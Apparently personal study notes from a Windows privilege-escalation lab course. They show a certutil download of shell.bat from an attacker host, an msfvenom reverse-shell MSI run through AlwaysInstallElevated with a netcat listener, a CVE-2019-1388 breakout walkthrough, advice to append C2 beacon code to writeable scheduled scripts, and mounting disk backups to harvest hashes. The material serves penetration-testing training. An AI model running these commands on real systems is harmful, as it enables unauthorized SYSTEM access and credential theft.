# Miscellaneous Techniques

## Living Off The Land Binaries and Scripts (LOLBAS)

> [!info] What is LOLBAS?
> The [LOLBAS project](https://lolbas-project.github.io/) documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each is a Microsoft-signed file that is either native to the OS or downloadable directly from Microsoft, with unexpected functionality useful to an attacker.

Interesting functionality categories:

| Category | Category | Category |
|---|---|---|
| Code execution | Code compilation | File transfers |
| Persistence | UAC bypass | Credential theft |
| Dumping process memory | Keylogging | Evasion |
| DLL hijacking | | |

### Transferring File with Certutil

[certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) is intended for certificate handling but can also transfer files — either downloading a file to disk or base64 encoding/decoding a file.

```powershell
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

### Encoding File with Certutil

```cmd
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

### Decoding File with Certutil

```cmd
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

> [!tip] rundll32.exe
> `rundll32.exe` can execute a DLL file — useful to obtain a reverse shell by executing a `.DLL` file downloaded onto the remote host or hosted on an SMB share.

> [!info] Why this matters
> It's worth becoming familiar with as many LOLBAS binaries/scripts/libraries as possible — they can be extremely useful during an evasive assessment, or one where the client restricts testing to only a managed Windows workstation/server instance.

## Always Install Elevated

Set via Local Group Policy — **Always install with elevated privileges** enabled under:

```
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer
```
![[Pasted image 20261001084052.png]]
### Enumerating Always Install Elevated Settings

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

> [!warning] Confirmation
> If the `AlwaysInstallElevated` key exists under both HKCU and HKLM, the policy is enabled on the target system and is exploitable.

### Generating MSI Package
We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges

```shellsession
s0nam@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

### Executing MSI Package
We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:
```cmd
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

### Catching Shell

```shellsession
s0nam@htb[/htb]$ nc -lnvp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]

C:\Windows\system32>whoami

whoami

```

> [!danger] Mitigation
> Disable the two Local Group Policy settings mentioned above (both HKCU and HKLM `AlwaysInstallElevated` values).

## CVE-2019-1388

> [!info] Vulnerability summary
> A privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link.

The **Issued By** field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) `1.3.6.1.4.1.311.2.1.10`. This OID is identified in [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) as  [SPC_SP_AGENCY_INFO_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) which is the `SpcSpAgencyInfo` field in the Details tab of the certificate dialog. If present, a hyperlink in that field renders in the General tab.

Clicking the hyperlink launches a browser window running as `NT AUTHORITY\SYSTEM`. From there, it's possible to "break out" of the browser via **View page source** to launch `cmd.exe` or `PowerShell.exe` as SYSTEM.

This can be exploited easily using an old Microsoft-signed executable ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) that contains a certificate with the `SpcSpAgencyInfo` field populated with a hyperlink.

### Walkthrough

1. Right-click `hhupd.exe` and select **Run as administrator**.


2. Click **Show information about the publisher's certificate** to open the certificate dialog — the `SpcSpAgencyInfo` field is populated in the Details tab.
![[Pasted image 20261001173551.png]]

3. Go back to the General tab — the **Issued by** field is populated with a hyperlink. Click it, then click OK; the certificate dialog closes and a browser window launches.
![[Pasted image 20261001173725.png]]

4. In Task Manager, the browser instance is shown running as SYSTEM.

![[Pasted image 20261001173742.png]]
5. Right-click the page → **View page source**. In the new tab, right-click again → **Save as** — a Save As dialog opens.
![[Pasted image 20261001173825.png]]
6. Type `c:\windows\system32\cmd.exe` in the file path and hit enter — a `cmd.exe` instance running as SYSTEM is launched.
![[Pasted image 20261001173947.png]]

> [!tip] Note
> Steps above were performed using Chrome and may differ slightly in other browsers.

> [!danger] Patch status
> Microsoft released a patch for this issue in November 2019. Many organizations fall behind on patching — always check for this vulnerability when GUI access is gained as a low-privilege user. [This link](https://support.microsoft.com/) lists all vulnerable Windows Server and Workstation versions.

> [!warning] Access limitation
> By default we can only see tasks created by our own user, plus default OS tasks. Tasks created by other users (e.g. admins) live in `C:\Windows\System32\Tasks`, which standard users cannot read. It's not uncommon for admins to misconfigure this folder with weaker permissions than intended — occasionally we may find a scheduled task running as admin with weak file/folder permissions, letting us modify the task or the script it runs.

### Checking Permissions on C:\Scripts Directory

> [!tip] Scenario
> Day four of a two-week engagement. Access gained to several systems as unprivileged users; all obvious privesc options exhausted. A writeable `C:\Scripts` directory was overlooked in initial enumeration.

```cmd
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright (c) 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

> [!danger] Exploitation path
> Scripts such as `db-backup.ps1`, `mailbox-backup.ps1`, etc. are writeable by `BUILTIN\Users`. Append a code snippet to one of these files assuming at least one runs on a daily (or more frequent) basis. Write a command to beacon back to C2 infrastructure. The next morning, a beacon returns as `NT AUTHORITY\SYSTEM` on the `DB01` host — confirming that one of the backup scripts executed the appended code overnight.
>
> This illustrates how important even the smallest enumeration finding can be to engagement success. Enumeration and post-exploitation are iterative — each pass across different systems may reveal another puzzle piece toward the goal.

## Mount VHDX/VMDK

> [!info] Why this matters
> During enumeration we may find interesting files locally or on network shares — passwords, SSH keys, or other useful data. [Snaffler](https://github.com/SnaffCon/Snaffler) can automate thorough enumeration for files with "pass" in the name, KeePass databases, SSH keys, `web.config` files, and more.

Three file types of particular interest:
- `.vhd` / `.vhdx` — Virtual Hard Disk / v2 (Hyper-V)
- `.vmdk` — Virtual Machine Disk (VMware)

> [!tip] Scenario
> Landed on a web server with no privesc luck, so we hunt network shares. A backups share hosts `.VMDK`/`.VHDX`whose filenames match hostnames in the network. — including one matching a host we couldn't escalate on, but which has an active Domain Admin session. Escalating to SYSTEM there could yield the user's NTLM hash or Kerberos TGT, and potentially the domain.

### Mount VMDK on Linux

```shellsession
s0nam@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

### Mount VHD/VHDX on Linux

```shellsession
s0nam@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

### Mounting on Windows

Right-click the file and choose **Mount**, or use the **Disk Management** utility  to mount a `.vhd` or `.vhdx` file.. Alternatively, use the  [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) PowerShell cmdlet. The virtual hard disk appears as a lettered drive that can then be browsed.
![[Pasted image 20261001180336.png]]

For a `.vmdk` file: right-click → **Map Virtual Disk**, then select a drive letter. If that fails, use **VMware Workstation,  File → Map Virtual Disks**, or add the `.vmdk` as an additional virtual hard drive on the attack VM. 7-Zip can also extract data directly from a `.vmdk` file. [This guide](https://kb.vmware.com/) illustrates several methods for accessing files on a `.vmdk`.

> [!tip] Why care about a virtual hard drive?
